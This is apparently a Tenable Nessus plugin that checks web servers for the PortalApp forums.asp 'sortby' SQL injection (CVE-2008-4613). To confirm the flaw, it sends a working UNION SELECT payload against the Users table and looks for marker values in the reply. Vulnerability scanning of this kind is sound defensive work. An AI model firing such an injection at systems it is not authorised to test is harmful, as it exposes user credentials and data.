#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(29897);
  script_version("1.18");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2008-4613");
  script_bugtraq_id(27170);
  script_xref(name:"EDB-ID", value:"4848");

  script_name(english:"PortalApp forums.asp sortby Parameter SQL Injection");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an ASP script that is prone to a SQL
injection attack.");
  script_set_attribute(attribute:"description", value:
"The remote host is running PortalApp, a CMS and portal system written
in ASP. 

The version of PortalApp installed on the remote host fails to
sanitize input to the 'sortby' parameter of the 'forums.asp' script
before using it in a database query.  An unauthenticated attacker may
be able to exploit this issue to manipulate database queries, leading
to disclosure of sensitive information (such as users and their
passwords defined to the affected application), modification of data,
or attacks against the underlying database. 

The application is also reportedly affected by similar issues in
several other scripts, although Nessus has not tested for them.");
  script_set_attribute(attribute:"see_also", value:"http://www.aspapp.com/forums.asp?ForumId=4&TopicId=3449");
  script_set_attribute(attribute:"solution", value:
"Apply the patches for 'common/i_utils.asp', 'forums.asp' and
'content.asp' referenced in the posting above.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_cwe_id(89);

  script_set_attribute(attribute:"plugin_publication_date", value:"2008/01/09");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2022 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/ASP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_asp(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/portalapp", "/portal", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to manipulate the search results returned.
  magic1 = unixtime();
  magic2 = rand() % 0xffff;
  magic3 = rand() % 10;
  magic4 = rand() % 0xffff;
  exploit = string(" UNION SELECT 1,2,3,4,5,", magic1, ",", magic2, ",8,9,10,", magic3, ",", magic4, ",13,14,15 FROM Users");

  r = http_send_recv3(method:"GET",
    item:string(
      dir, "/forums.asp?",
      "keywords=", SCRIPT_NAME, "&",
      "do_search=1&",
      "sortby=users.user_name", urlencode(str:exploit)
    ), 
    port:port
  );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # it's PortalApp and...
    (
      "<!-- PortalApp" >< res ||
      " alt='powered by PortalApp'" >< res
    ) &&
    # we see our magic in the answer.
    string(' title="10">', magic1, "</A") >< res &&
    string("class=dataFont>", magic2, "</a>") >< res &&
    string('\t', magic3) >< res &&
    string('\t', magic4) >< res
  )
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
